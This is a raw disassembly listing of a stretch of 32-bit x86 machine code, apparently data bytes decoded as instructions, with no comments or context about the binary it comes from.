  4017d3:	jb     0x401816
  4017d5:	add    ah,cl
  4017d7:	fwait
  4017d8:	add    BYTE PTR [eax-0x77f97c00],bh
  4017de:	js     0x4017f1
  4017e0:	and    DWORD PTR [eax],eax
  4017e2:	leave  
  4017e3:	mov    BYTE PTR [eax],al
  4017e5:	adc    DWORD PTR [ebx+0x2e],esi
  4017e8:	shl    BYTE PTR [eax],0x2
  4017eb:	loop   0x4017f6
  4017ed:	dec    ecx
  4017ee:	mov    BYTE PTR [ecx],ah
  4017f0:	enter  0x3130,0x4
  4017f4:	add    al,0x15
  4017f6:	or     eax,0x18110063
  4017fb:	add    BYTE PTR [edx],0x40
  4017fe:	xor    al,0x56
  401800:	and    eax,0x10920011
  401805:	add    eax,0x500a10a0
  40180a:	inc    eax
  40180b:	add    BYTE PTR [esp+edi*1],al
  40180e:	adc    DWORD PTR [edx],edx
  401810:	test   ah,al
  401812:	add    BYTE PTR [eax],al
  401814:	cmp    DWORD PTR [ebx-0x7c],ecx
  401817:	in     al,0x30
  401819:	xor    BYTE PTR [eax],al
  40181b:	shr    BYTE PTR [eax],0x8
  40181e:	or     BYTE PTR [ecx],al
  401820:	add    BYTE PTR [ecx],al
  401822:	jmp    0x9a532b29
  401827:	sub    BYTE PTR [eax],dl
  401829:	in     al,0x64
  40182b:	push   edx
  40182c:	shl    BYTE PTR [eax],0x3a
  40182f:	inc    eax
  401830:	sbb    BYTE PTR [ebx+0x58a20402],cl
  401836:	adc    al,0x11
  401838:	loopne 0x4018a4
  40183a:	es dec eax
  40183c:	inc    eax
  40183d:	dec    ecx
  40183e:	adc    BYTE PTR [eax+eax*1],ah
  401841:	add    DWORD PTR [ecx],eax
  401843:	(bad)  
  401844:	ret    0x2108
  401847:	add    al,0x31
  401849:	add    BYTE PTR [eax+0x4b],0x8a
  40184d:	add    DWORD PTR [edx+0x38],edx
  401850:	add    BYTE PTR [ecx+0x69000422],0x3
  401857:	and    BYTE PTR [eax+0x40840820],al
  40185d:	ret    0x4401
  401860:	add    BYTE PTR [eax],al
  401862:	and    BYTE PTR [eax+0x0],al
  401865:	daa    
  401866:	xor    al,0x41
  401868:	and    BYTE PTR [eax+0x620939a4],al
  40186e:	test   BYTE PTR [esi+0x4a],dl
  401871:	sbb    BYTE PTR [eax],bl
  401873:	and    esp,DWORD PTR [eax+0x4a116c48]
  401879:	pusha  
  40187a:	and    dl,BYTE PTR [eax]
  40187c:	xor    al,0x72
  40187f:	add    ah,BYTE PTR [esi+0x28041f24]
  401885:	and    DWORD PTR [ecx],eax
  401887:	jo     0x40181d
  401889:	add    al,0x68
  40188b:	dec    eax
  40188c:	and    bh,BYTE PTR [ebx]
  40188e:	adc    BYTE PTR [eax],bl
  401890:	or     BYTE PTR [edx],dl
  401892:	inc    eax
  401893:	mov    ds:0x2001900,al
  401898:	inc    eax
  401899:	nop
  40189a:	popa   
  40189b:	add    eax,DWORD PTR [esi]
  40189d:	and    DWORD PTR [eax+0x6a082014],eax
  4018a3:	and    DWORD PTR [eax+0x84083],eax
  4018a9:	inc    ebx
  4018aa:	test   BYTE PTR [edx+eax*1+0x1210e00],al
  4018b1:	or     BYTE PTR [ecx],al
  4018b3:	mov    eax,DWORD PTR [eax]
  4018b5:	or     BYTE PTR [edx],0x41
  4018b8:	adc    eax,0x814a043d
  4018bd:	adc    BYTE PTR [edx+0x74],al
  4018c0:	and    BYTE PTR [eax],cl
  4018c2:	adc    DWORD PTR [ecx],eax
  4018c4:	sbb    BYTE PTR [eax-0x7bd60000],al
  4018ca:	add    ah,cl
  4018cc:	or     BYTE PTR [edx+0x2],cl
  4018cf:	mov    cl,0x2a
  4018d1:	lock or eax,DWORD PTR [esi-0x3f]
  4018d5:	add    BYTE PTR [eax+eax*1+0x50108060],dl
  4018dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018dd:	cwde   
  4018de:	xchg   DWORD PTR [edx+0x40152428],ebp
  4018e4:	jb     0x4018e6
  4018e6:	add    DWORD PTR [ecx],eax
  4018e8:	add    BYTE PTR [edx],al
  4018ea:	test   eax,0x98c408
  4018ef:	add    cl,BYTE PTR [eax-0x2bf5ebf0]
  4018f5:	and    BYTE PTR [edx+0x0],dl
  4018f8:	xchg   ebp,eax
  4018f9:	adc    BYTE PTR [eax],dl
  4018fb:	shl    BYTE PTR [eax],1
  4018fd:	dec    ecx
  4018fe:	subps  xmm2,XMMWORD PTR [ecx+eax*2]
  401902:	and    BYTE PTR [esi+0x2],0x5
  401906:	adc    al,0x10
  401908:	or     DWORD PTR [eax],eax
  40190a:	sub    BYTE PTR [edi],al
  40190c:	cmp    al,0x62
  40190e:	into   
  40190f:	bound  eax,QWORD PTR [ebx]
  401911:	push   es
  401912:	adc    BYTE PTR [eax+0x8],0x34
  401916:	inc    esp
  401917:	add    ah,BYTE PTR [eax]
  401919:	or     al,BYTE PTR [eax+0x3449092]
  40191f:	inc    eax
  401920:	inc    eax
  401921:	add    BYTE PTR [esi],al
  401923:	add    BYTE PTR [ecx+0x408a728],al
  401929:	or     BYTE PTR [eax],cl
  40192b:	mov    cs,WORD PTR [eax+0x24214008]
  401931:	add    al,BYTE PTR [eax]
  401933:	add    al,0xa
  401935:	inc    edx
  401936:	add    BYTE PTR [eax],bl
  401938:	sbb    cl,BYTE PTR [ecx+ecx*1]
  40193b:	test   BYTE PTR [eax],bl
  40193d:	dec    edi
  40193e:	add    BYTE PTR [eax-0x7ff2f82a],al
  401944:	xchg   ebp,eax
  401945:	sub    BYTE PTR [ecx+0xa424208],bh
  40194b:	aaa    
  40194c:	add    BYTE PTR ds:0xe50040,cl
  401952:	adc    DWORD PTR [edx],esi
  401954:	add    DWORD PTR [ecx-0x5b9ae77e],0xffffffa8
  40195b:	sbb    BYTE PTR [ecx],bl
  40195d:	xchg   al,dl
  40195f:	add    BYTE PTR [eax+0x4e],al
  401962:	add    BYTE PTR [eax+0x46030100],dl
  401968:	adc    BYTE PTR [ebx],al
  40196a:	test   BYTE PTR [ecx],al
  40196c:	enter  0x3281,0xa6
  401970:	rcl    DWORD PTR [esi+ecx*1],0x8
  401974:	lods   eax,DWORD PTR ds:[esi]
  401975:	or     DWORD PTR [ebx],esp
  401977:	dec    edx
  401978:	add    al,dl
  40197a:	gs push 0xa100242
  401980:	mov    BYTE PTR [ecx],ah
  401982:	popa   
  401983:	add    BYTE PTR [eax],dl
  401985:	or     DWORD PTR [eax],eax
  401987:	leave  
  401988:	(bad)  
  401989:	mul    BYTE PTR [ecx]
  40198b:	and    BYTE PTR [edx+0x30020010],cl
  401991:	or     BYTE PTR [eax+ebp*1+0x104b010e],al
  401998:	cwde   
  401999:	inc    ecx
  40199a:	shl    BYTE PTR [ebx+0x3aa48200],0x10
  4019a1:	add    DWORD PTR [edx],esp
  4019a3:	or     DWORD PTR [edx],eax
  4019a5:	add    eax,0x43800ae0
  4019aa:	test   al,0x0
  4019ac:	and    DWORD PTR [eax],0x4431080
  4019b2:	mov    BYTE PTR [eax],cl
  4019b4:	dec    ebx
  4019b5:	and    al,BYTE PTR [ecx-0x7b]
  4019b8:	and    ch,cl
  4019ba:	add    BYTE PTR [ecx-0x7f7fdf40],dl
  4019c0:	or     al,BYTE PTR [ebx]
  4019c2:	xor    BYTE PTR [eax],al
  4019c4:	pop    es
  4019c5:	mov    ah,0x0
  4019c7:	add    BYTE PTR [eax],cl
  4019c9:	nop
  4019ca:	add    dl,BYTE PTR [eax]
  4019cc:	sbb    BYTE PTR [eax],al
  4019ce:	pusha  
  4019cf:	add    BYTE PTR [esi],0x3a
  4019d2:	mov    BYTE PTR [eax],cl
  4019d4:	add    BYTE PTR [ebx+eax*8+0x1d004240],al
  4019db:	pusha  
  4019dc:	xor    BYTE PTR [esp],al
  4019df:	pop    es
  4019e0:	adc    BYTE PTR [eax],cl
  4019e2:	add    DWORD PTR [eax-0x78],edx
  4019e5:	scas   al,BYTE PTR es:[edi]
  4019e6:	or     ch,BYTE PTR [eax]
  4019e8:	and    dl,dl
  4019ea:	rol    DWORD PTR [edx+0x2],0x14
  4019ee:	or     dh,BYTE PTR [eax]
  4019f0:	add    BYTE PTR [eax+0x1051420a],ah
  4019f6:	add    BYTE PTR [eax],al
  4019f8:	add    DWORD PTR [eax+0x46c61854],esp
  4019fe:	and    BYTE PTR [edx],al
  401a00:	adc    DWORD PTR [eax],eax
  401a02:	add    DWORD PTR [eax-0x40],esp
  401a05:	and    eax,0x47c020e0
  401a0a:	add    al,0x5d
  401a0c:	add    BYTE PTR [eax+0x0],al
  401a0f:	add    cl,dl
  401a11:	test   BYTE PTR [eax-0x7e],dl
  401a14:	sub    al,BYTE PTR [eax+0x30028046]
  401a1a:	or     dl,BYTE PTR [ecx+edi*1]
  401a1d:	and    BYTE PTR [edx],ah
  401a1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a20:	nop
  401a21:	add    DWORD PTR [ecx-0x7c],0x418
  401a28:	and    eax,DWORD PTR [eax+0x3000086]
  401a2e:	pop    eax
  401a2f:	data16 and cl,BYTE PTR [eax+0x42]
  401a33:	inc    ecx
  401a34:	push   eax
  401a35:	or     al,cl
  401a37:	or     BYTE PTR [ecx],dl
  401a39:	and    BYTE PTR [eax],al
  401a3b:	or     al,0x89
  401a3d:	adc    BYTE PTR [edx-0x7ff53fe0],al
  401a43:	push   es
  401a44:	add    BYTE PTR ds:0x41901866,al
  401a4a:	and    BYTE PTR [edx],dl
  401a4c:	inc    eax
  401a4d:	or     al,0x0
  401a4f:	xor    DWORD PTR [eax+eax*2],eax
  401a52:	push   ecx
  401a53:	mov    al,BYTE PTR [edx]
  401a55:	add    DWORD PTR [eax-0x58],eax
  401a58:	inc    eax
  401a59:	mov    BYTE PTR [eax+0x4],cl
  401a5c:	xor    al,0x1d
  401a5e:	mov    BYTE PTR [eax],ah
  401a60:	pop    eax
  401a61:	add    eax,esi
  401a63:	add    BYTE PTR [ebp+0x6],ah
  401a66:	int    0x2
  401a68:	and    DWORD PTR [edx+0x2a],0x48902ab0
  401a6f:	add    DWORD PTR [ecx+ebp*1],ebx
  401a72:	xchg   esp,eax
  401a73:	add    BYTE PTR [ecx-0x7c],dl
  401a76:	fwait
  401a77:	xchg   DWORD PTR ds:0x9023212b,eax
  401a7d:	and    al,0x4c
  401a7f:	add    BYTE PTR [eax],bl
  401a81:	add    DWORD PTR [edx+0x9],0x14042981
  401a88:	add    DWORD PTR [edx-0x38],eax
  401a8b:	or     al,0x9e
  401a8d:	add    al,BYTE PTR [eax]
  401a8f:	cwde   
  401a90:	mov    WORD PTR [eax],gs
  401a92:	mov    ds:0x2400000c,al
  401a97:	or     BYTE PTR [ecx],0x2a
  401a9a:	or     BYTE PTR [eax-0x5f],bl
  401a9d:	or     al,BYTE PTR [eax]
  401a9f:	dec    eax
  401aa0:	and    esp,0x80002
  401aa6:	pusha  
  401aa7:	add    BYTE PTR [eax+0x30],dl
  401aaa:	add    DWORD PTR [esi],esp
  401aac:	and    BYTE PTR [ecx+0x801a04a],dl
  401ab2:	push   edx
  401ab3:	inc    ecx
  401ab4:	or     BYTE PTR [eax],0x6
  401ab7:	add    BYTE PTR ds:0x391a8100,al
  401abd:	sub    DWORD PTR [edi+0x5008001],ecx
  401ac3:	shr    BYTE PTR [eax],cl
  401ac5:	adc    BYTE PTR [eax],dh
  401ac7:	sbb    BYTE PTR ds:0x104858,dl
  401acd:	pusha  
  401ace:	dec    eax
  401acf:	inc    ebx
  401ad0:	or     BYTE PTR [eax],cl
  401ad2:	test   al,0x0
  401ad4:	add    DWORD PTR [esi],eax
  401ad6:	adc    al,0x2d
  401ad8:	xor    BYTE PTR [eax],al
  401ada:	dec    eax
  401adb:	mov    al,ds:0x22000e8
  401ae0:	mov    WORD PTR [ebp+0x0],es
  401ae3:	inc    dx
  401ae5:	and    BYTE PTR [ecx+0x20],al
  401ae8:	inc    eax
  401ae9:	and    BYTE PTR [ecx],al
  401aeb:	and    BYTE PTR [edx+0x5058416],al
  401af1:	cmp    BYTE PTR [esi],ch
  401af3:	add    al,0x10
  401af5:	bound  ecx,QWORD PTR [eax]
  401af7:	pusha  
  401af8:	dec    esi
  401af9:	add    al,0x45
  401afb:	cmp    BYTE PTR [eax+0x40e05900],al
  401b01:	or     BYTE PTR [ecx-0x4fd7be00],al
  401b07:	cmp    al,BYTE PTR [eax-0x7bdf5fff]
  401b0d:	or     BYTE PTR [edx],dh
  401b0f:	add    DWORD PTR [ebx+0x2a],eax
  401b12:	add    BYTE PTR [eax+0x4129018],bl
  401b18:	inc    edx
  401b19:	inc    ecx
  401b1a:	and    BYTE PTR [ecx],cl
  401b1c:	loopne 0x401b1e
  401b1e:	adc    al,0x23
  401b20:	lea    eax,[eax]
  401b22:	xor    BYTE PTR [esp+ecx*4],al
  401b25:	push   edx
  401b26:	les    eax,FWORD PTR [ecx]
  401b28:	adc    dh,BYTE PTR [ecx+0x11]
  401b2b:	push   es
  401b2c:	add    BYTE PTR [edx],ch
  401b2e:	dec    ecx
  401b2f:	and    eax,0x489003c
  401b34:	add    BYTE PTR ds:0xa0880033,cl
  401b3a:	inc    eax
  401b3b:	rcr    BYTE PTR [ecx+edx*2],0x86
  401b3f:	and    cl,BYTE PTR [ecx]
  401b41:	and    DWORD PTR [eax-0x25beecff],edx
  401b47:	and    BYTE PTR [esp+ecx*1],dl
  401b4a:	push   ds
  401b4b:	add    BYTE PTR [eax],cl
  401b4d:	mov    eax,ds:0x48a24512
  401b52:	add    BYTE PTR [eax],0x20
  401b55:	adc    DWORD PTR [eax],0x28100440
  401b5b:	dec    edx
  401b5c:	outs   dx,BYTE PTR ds:[esi]
  401b5d:	mov    eax,0x14002004
  401b62:	xor    BYTE PTR [eax],dl
  401b64:	add    BYTE PTR [eax],ah
  401b66:	pusha  
  401b67:	or     BYTE PTR [eax+0x5b1614e1],dl
  401b6d:	or     ch,BYTE PTR ds:0x8213380c
  401b73:	mov    WORD PTR [edx],fs
  401b75:	sbb    BYTE PTR [eax+ecx*4+0x9],dh
  401b79:	or     BYTE PTR [eax+esi*1],bl
  401b7c:	and    BYTE PTR cs:[eax],cl
  401b7f:	xor    DWORD PTR [eax+0x0],eax
  401b82:	cli    
  401b83:	add    eax,0x40e15044
  401b88:	xchg   ecx,eax
  401b89:	inc    edx
  401b8a:	or     al,ah
  401b8c:	inc    ebp
  401b8d:	les    ebp,FWORD PTR [edx+0x38220819]
  401b93:	add    DWORD PTR [edx],eax
  401b95:	add    eax,edx
  401b97:	sbb    BYTE PTR [ebx+0x46453840],dl
  401b9d:	inc    edx
  401b9e:	pop    eax
  401b9f:	xchg   BYTE PTR [edx],al
  401ba1:	pusha  
  401ba2:	adc    esp,DWORD PTR [ecx+esi*2+0x4b6060]
  401ba9:	add    BYTE PTR [ebp+0x40],dl
  401bac:	add    BYTE PTR [eax-0x60],cl
  401baf:	adc    eax,0x82200010
  401bb4:	and    BYTE PTR [esi],cl
  401bb6:	and    BYTE PTR [edx],0x20
  401bb9:	add    cl,BYTE PTR [eax+0x40]
  401bbc:	loop   0x401b76
  401bbe:	sub    BYTE PTR [edx+0x20],ah
  401bc1:	mov    BYTE PTR [eax+0x54403441],al
  401bc7:	pusha  
  401bc8:	ret    0x841
  401bcb:	add    esp,DWORD PTR [edx]
  401bcd:	or     BYTE PTR [eax-0x3fb777f9],al
  401bd3:	add    DWORD PTR ds:0x10154892,ecx
  401bd9:	sub    BYTE PTR [eax+0x6421008],ch
  401bdf:	out    dx,al
  401be0:	add    BYTE PTR ds:0x1091e45,al
  401be6:	and    al,BYTE PTR [edx+0x7]
  401be9:	test   DWORD PTR [ebx+0x1],eax
  401bec:	or     BYTE PTR [eax],0x22
  401bef:	xlat   BYTE PTR ds:[ebx]
  401bf0:	pusha  
  401bf1:	or     DWORD PTR [ecx+0xc186420],edx
  401bf7:	jae    0x401c39
  401bf9:	add    BYTE PTR [eax],cl
  401bfb:	xor    BYTE PTR [eax],0x98
  401bfe:	ret    0x410
  401c01:	or     cl,BYTE PTR [eax+0xb184b65]
  401c07:	mov    BYTE PTR [edx+0x29],ah
  401c0a:	add    al,0x62
  401c0c:	push   ss
  401c0d:	or     BYTE PTR [ecx+0x1206012],al
  401c13:	sbb    BYTE PTR [eax+ecx*1],0x8
  401c17:	mov    BYTE PTR [eax],al
  401c19:	xor    BYTE PTR [eax],al
  401c1b:	push   eax
  401c1c:	or     BYTE PTR [eax],al
  401c1e:	and    ah,BYTE PTR [eax]
  401c20:	xchg   ecx,eax
  401c21:	inc    esp
  401c22:	add    DWORD PTR [eax+edx*4],ecx
  401c25:	sub    BYTE PTR [eax],cl
  401c27:	add    BYTE PTR [eax+0x6],al
  401c2a:	inc    ebx
  401c2b:	and    al,BYTE PTR [eax-0x2d]
  401c2e:	add    BYTE PTR [eax+eax*8],al
  401c31:	add    BYTE PTR [edx],al
  401c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c34:	or     eax,ecx
  401c36:	and    al,BYTE PTR [eax+0x41]
  401c39:	stos   BYTE PTR es:[edi],al
  401c3a:	add    al,0x41
  401c3c:	xchg   esp,eax
  401c3d:	jb     0x401c41
  401c3f:	sbb    DWORD PTR [ecx],eax
  401c41:	or     al,0x2
  401c43:	xchg   esp,eax
  401c44:	add    BYTE PTR [eax+eax*2],0x2d
  401c48:	adc    al,BYTE PTR [edx]
  401c4a:	add    BYTE PTR ds:0x4810f46,cl
  401c50:	adc    BYTE PTR ds:0x60418820,ah
  401c56:	fcom   DWORD PTR [eax+0x7]
  401c59:	mov    eax,ds:0x2028002
  401c5e:	lds    edx,FWORD PTR [ecx]
  401c60:	add    BYTE PTR [ecx],0x32
  401c63:	and    bl,BYTE PTR [eax]
  401c65:	add    DWORD PTR [edx],0x22
  401c68:	les    edx,FWORD PTR [eax]
  401c6a:	add    BYTE PTR [esi+0x28],al
  401c6d:	rol    BYTE PTR [eax],0x70
  401c70:	adc    BYTE PTR [ecx],al
  401c72:	xchg   esi,eax
  401c73:	rol    BYTE PTR [eax],1
  401c75:	or     BYTE PTR [eax],al
  401c77:	sbb    BYTE PTR [ebx+eax*1+0x1236090],dl
  401c7e:	rcl    BYTE PTR [ebp+0x40020750],0x80
  401c85:	add    DWORD PTR [edx],eax
  401c87:	sbb    BYTE PTR [eax+0x16],ch
  401c8a:	or     BYTE PTR [ecx+0x8],al
  401c8d:	adc    DWORD PTR [edx],esi
  401c8f:	and    DWORD PTR [ebx+ecx*1],eax
  401c92:	sbb    al,ah
  401c94:	shl    BYTE PTR [ecx+0x0],0x24
  401c98:	add    al,cl
  401c9a:	and    al,al
  401c9c:	xchg   esp,eax
  401c9d:	or     DWORD PTR [eax+0x28],eax
  401ca0:	add    eax,0x80845020
  401ca5:	mov    al,ds:0x28210c82
  401caa:	dec    esi
  401cab:	rol    BYTE PTR [eax+esi*1+0x44],0xe0
  401cb0:	test   DWORD PTR [ecx+0x6],edx
  401cb3:	add    BYTE PTR [eax+eax*4],al
  401cb6:	sbb    BYTE PTR [ebx],al
  401cb8:	add    BYTE PTR [eax+0x12],al
  401cbb:	adc    al,BYTE PTR [eax]
  401cbd:	add    BYTE PTR [edx+0x5],ah
  401cc0:	add    dh,BYTE PTR [ecx]
  401cc2:	or     al,0x0
  401cc4:	sub    DWORD PTR [ecx],esi
  401cc6:	pop    eax
  401cc7:	pusha  
  401cc8:	or     BYTE PTR [edx],cl
  401cca:	add    BYTE PTR [ecx],cl
  401ccc:	inc    esi
  401ccd:	mov    ah,0x10
  401ccf:	and    eax,0xa4a09819
  401cd4:	cdq    
  401cd5:	add    dh,BYTE PTR [edi]
  401cd7:	adc    BYTE PTR [ecx],cl
  401cd9:	shr    DWORD PTR [eax],0x22
  401cdc:	add    BYTE PTR [eax],0xd0
  401cdf:	or     BYTE PTR [eax+0x408808af],0x2
  401ce6:	add    al,0x40
  401ce8:	add    al,cl
  401cea:	pusha  
  401ceb:	and    BYTE PTR [eax],ch
  401ced:	or     BYTE PTR ds:0xa8823415,0x51
  401cf4:	add    BYTE PTR [ebp+0x14],dh
  401cf7:	inc    ecx
  401cf8:	sub    BYTE PTR [edx+ecx*1],al
  401cfb:	retf   0x2242
  401cfe:	inc    ecx
  401cff:	in     eax,0x0
  401d01:	and    eax,0x2150a410
  401d06:	add    al,0x10
  401d08:	cwde   
  401d09:	nop
  401d0a:	shl    DWORD PTR [ecx+edx*4],0x5c
  401d0e:	and    BYTE PTR [edx],cl
  401d10:	add    al,BYTE PTR [edx]
  401d12:	inc    eax
  401d13:	xor    BYTE PTR [eax+ebp*1+0xf124b8a],al
  401d1a:	mov    cl,0x24
  401d1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d1d:	xor    dl,cl
  401d1f:	pushf  
  401d20:	adc    al,BYTE PTR [edx+eax*8]
  401d23:	bound  ecx,QWORD PTR ds:0xa104432
  401d29:	inc    esi
  401d2a:	and    al,BYTE PTR ds:0xa010c23
  401d30:	xor    BYTE PTR [eax+eax*1+0x2c4d2029],ah
  401d37:	add    al,al
  401d39:	xchg   ebx,eax
  401d3a:	add    BYTE PTR [eax],dl
  401d3c:	and    BYTE PTR [eax-0x2dcff5c0],dl
  401d42:	or     BYTE PTR [esp+eax*1],dl
  401d45:	inc    eax
  401d46:	push   eax
  401d47:	and    al,0x0
  401d49:	jo     0x401d42
  401d4b:	mov    dh,0x3
  401d4d:	or     BYTE PTR [edx+eax*1],0x71
  401d51:	add    ah,BYTE PTR [eax+0x18]
  401d54:	add    BYTE PTR ds:0x214,ah
  401d5a:	add    al,0xa1
  401d5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d5d:	push   es
  401d5e:	inc    edx
  401d5f:	and    al,BYTE PTR [eax]
  401d61:	outs   dx,BYTE PTR ds:[esi]
  401d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d63:	add    eax,0x298c1d03
  401d68:	add    al,BYTE PTR [esi]
  401d6a:	adc    ah,BYTE PTR [eax]
  401d6c:	repnz add BYTE PTR [ecx],ch
  401d6f:	loopne 0x401d01
  401d71:	cwde   
  401d72:	or     BYTE PTR [ecx+0x2],dh
  401d75:	inc    eax
  401d76:	and    al,0x2
  401d78:	mov    al,BYTE PTR [eax+eax*8]
  401d7b:	dec    ebp
  401d7c:	add    BYTE PTR [edx],cl
  401d7e:	cmp    DWORD PTR [eax],edx
  401d80:	sub    cl,dh
  401d82:	enter  0x20,0xe
  401d86:	and    esp,DWORD PTR [edx+0x41]
  401d89:	and    al,0x80
  401d8b:	leave  
  401d8c:	lods   al,BYTE PTR ds:[esi]
  401d8d:	out    dx,eax
  401d8e:	add    al,0x14
  401d90:	xor    BYTE PTR [eax],cl
  401d92:	add    BYTE PTR [eax],dl
  401d94:	fs jb  0x401db7
  401d97:	add    DWORD PTR [eax-0x80],eax
  401d9a:	or     al,0x8
  401d9c:	rol    DWORD PTR [eax],0x48
  401d9f:	arpl   sp,cx
  401da1:	jb     0x401dc3
  401da3:	adc    eax,0x16122400
  401da8:	inc    ecx
  401da9:	add    BYTE PTR [eax+eax*2-0x74],al
  401dad:	xchg   ecx,eax
  401dae:	sub    al,0x88
  401db0:	rcl    DWORD PTR [eax-0x77b9d7fd],0x0
  401db7:	add    al,BYTE PTR [edx]
  401db9:	or     BYTE PTR [ebx],al
  401dbb:	cmp    BYTE PTR [eax+0x1f039010],al
  401dc1:	or     al,0x81
  401dc3:	add    DWORD PTR [eax+0x20],eax
  401dc6:	and    DWORD PTR [ecx],esp
  401dc8:	or     BYTE PTR [ebx+eax*2+0x4a],al
  401dcc:	or     BYTE PTR [ecx],ah
  401dce:	and    al,0x5
  401dd0:	add    eax,edx
  401dd2:	add    BYTE PTR [eax],cl
  401dd4:	mov    al,ds:0x2102080a
  401dd9:	cmp    DWORD PTR [eax],0x40
  401ddc:	push   ebx
  401ddd:	add    cl,BYTE PTR [eax]
  401ddf:	add    eax,0x15000012
  401de4:	sub    al,al
  401de6:	adc    BYTE PTR [eax-0x3d],cl
  401de9:	and    BYTE PTR [edx],cl
  401deb:	or     BYTE PTR [eax+0x40b00080],al
  401df1:	add    dl,BYTE PTR [edx+0x40]
  401df4:	add    BYTE PTR [eax],bl
  401df6:	adc    BYTE PTR [eax],dl
  401df8:	sbb    DWORD PTR [edx+eax*2],eax
  401dfb:	sbb    DWORD PTR [eax],eax
  401dfd:	push   es
  401dfe:	xor    BYTE PTR [eax],al
  401e00:	push   cs
  401e01:	or     eax,0x831008b8
  401e06:	or     BYTE PTR [ecx],ah
  401e08:	jbe    0x401e0a
  401e0a:	and    eax,0xf021180
  401e0f:	add    BYTE PTR [esi],al
  401e11:	add    DWORD PTR [eax+0x43010290],eax
  401e17:	add    BYTE PTR [eax+0x16942110],dh
  401e1d:	adc    BYTE PTR [edx],0x21
  401e20:	add    BYTE PTR [edx],al
  401e22:	or     BYTE PTR [ecx+0x40],ah
  401e25:	push   eax
  401e26:	rcl    eax,0x4
  401e29:	add    BYTE PTR [eax],0xb
  401e2c:	ret    
  401e2d:	push   esp
  401e2e:	fs push edi
  401e30:	sub    DWORD PTR [edx+0x488103b2],eax
  401e36:	sbb    BYTE PTR [eax],ah
  401e38:	push   cs
  401e39:	add    BYTE PTR [ebp+0x54600020],bh
  401e3f:	add    DWORD PTR [eax+ecx*1],ebp
  401e42:	mov    al,0x4
  401e44:	xchg   edi,eax
  401e45:	add    BYTE PTR [eax+0x21],ah
  401e48:	sbb    dl,BYTE PTR [ebp+0x100e8022]
  401e4e:	add    DWORD PTR [eax],edx
  401e50:	push   es
  401e51:	or     BYTE PTR [esp+eax*1],dh
  401e54:	adc    BYTE PTR [ecx],cl
  401e56:	adc    DWORD PTR [eax-0x10],edx
  401e59:	or     ah,al
  401e5b:	loopne 0x401e60
  401e5d:	or     BYTE PTR [eax],cl
  401e5f:	and    ecx,edx
  401e61:	xchg   BYTE PTR [ecx],ah
  401e63:	test   BYTE PTR [ecx],ah
  401e65:	sbb    cl,BYTE PTR [ebp+eiz*2+0x0]
  401e69:	push   ebx
  401e6a:	and    eax,0x84190aa0
  401e6f:	or     BYTE PTR [eax],dl
  401e71:	or     BYTE PTR [eax+0x30],al
  401e74:	adc    dl,al
  401e76:	and    DWORD PTR [ecx],edx
  401e78:	add    BYTE PTR [eax+0x11],bl
  401e7b:	pop    ebp
  401e7c:	sbb    BYTE PTR [eax+eax*4],0x4
  401e80:	inc    ecx
  401e81:	mov    cl,0x0
  401e83:	and    eax,0x10a00403
  401e88:	dec    eax
  401e89:	and    BYTE PTR [ecx],al
  401e8b:	push   ss
  401e8c:	add    al,BYTE PTR [eax]
  401e8e:	xor    dl,BYTE PTR [edx+0xa]
  401e91:	add    ah,BYTE PTR [ecx]
  401e93:	push   cs
  401e94:	inc    esi
  401e95:	adc    esp,DWORD PTR [eax]
  401e97:	add    al,0x8
  401e99:	and    eax,0x708e4ac0
  401e9e:	add    al,0x81
  401ea0:	adc    bh,BYTE PTR [ecx+0x79202801]
  401ea6:	lock or BYTE PTR [eax],ah
  401ea9:	mov    BYTE PTR [edx-0x3fd7b798],ah
  401eaf:	add    BYTE PTR [eax+0x50],ah
  401eb2:	push   0x54508004
  401eb7:	loop   0x401ebd
  401eb9:	add    ecx,DWORD PTR [eax]
  401ebb:	add    BYTE PTR [esi+edx*1-0x5d],al
  401ebf:	and    BYTE PTR [ecx+0x24],al
  401ec2:	add    al,0x0
  401ec4:	in     al,dx
  401ec5:	adc    DWORD PTR [edx+0xa10199a],edi
  401ecb:	pusha  
  401ecc:	adc    DWORD PTR [ebx-0x80],edx
  401ecf:	xor    eax,0x5022804b
  401ed4:	aam    0x12
  401ed6:	add    eax,0x14000912
  401edb:	in     al,dx
  401edc:	add    al,BYTE PTR [edx]
  401ede:	bound  eax,QWORD PTR [edx]
  401ee0:	inc    ebx
  401ee1:	or     eax,0x5001011
  401ee6:	add    DWORD PTR [edx+0x42600003],eax
  401eec:	add    BYTE PTR [edx],cl
  401eee:	fs or  al,0x64
  401ef1:	inc    esp
  401ef2:	inc    eax
  401ef3:	and    al,BYTE PTR [edx+eax*1]
  401ef6:	dec    ecx
  401ef7:	mov    dh,0x20
  401efa:	adc    al,0x39
  401efc:	inc    ebx
  401efd:	and    DWORD PTR [eax],eax
  401eff:	mov    cs,WORD PTR [eax]
  401f01:	pop    eax
  401f02:	test   BYTE PTR [ecx],al
  401f04:	and    al,0x26
  401f06:	stos   DWORD PTR es:[edi],eax
  401f07:	add    ecx,edx
  401f09:	or     BYTE PTR [eax],dl
  401f0b:	jo     0x401eef
  401f0d:	add    al,0x1a
  401f0f:	mov    WORD PTR [ecx],fs
  401f11:	add    BYTE PTR [ecx+0x0],al
  401f14:	mov    al,gs:0x52a01008
  401f1a:	or     al,0x80
  401f1c:	add    BYTE PTR [eax],cl
  401f1e:	add    DWORD PTR [ecx+0x1086038e],eax
  401f24:	inc    ecx
  401f25:	enter  0x504,0x16
  401f29:	adc    al,0x4
  401f2b:	add    BYTE PTR [eax],al
  401f2d:	or     DWORD PTR [ecx-0x7efdffd7],eax
  401f33:	xchg   ecx,eax
  401f34:	sbb    ah,BYTE PTR ds:0x484011a4
  401f3a:	mov    ds:0xfca2c082,al
  401f3f:	inc    esp
  401f40:	dec    esp
  401f41:	add    BYTE PTR [eax],al
  401f43:	adc    edx,DWORD PTR [esi]
  401f45:	or     DWORD PTR [edx],edx
  401f47:	add    ebx,DWORD PTR [ecx]
  401f49:	test   al,cl
  401f4b:	sub    BYTE PTR [ebp+0x121b1b00],al
  401f51:	inc    eax
  401f52:	pop    edx
  401f53:	adc    dl,BYTE PTR [esp+0x1398c330]
  401f5a:	ds test al,0x40
  401f5d:	or     BYTE PTR [ecx+edx*2],0x17
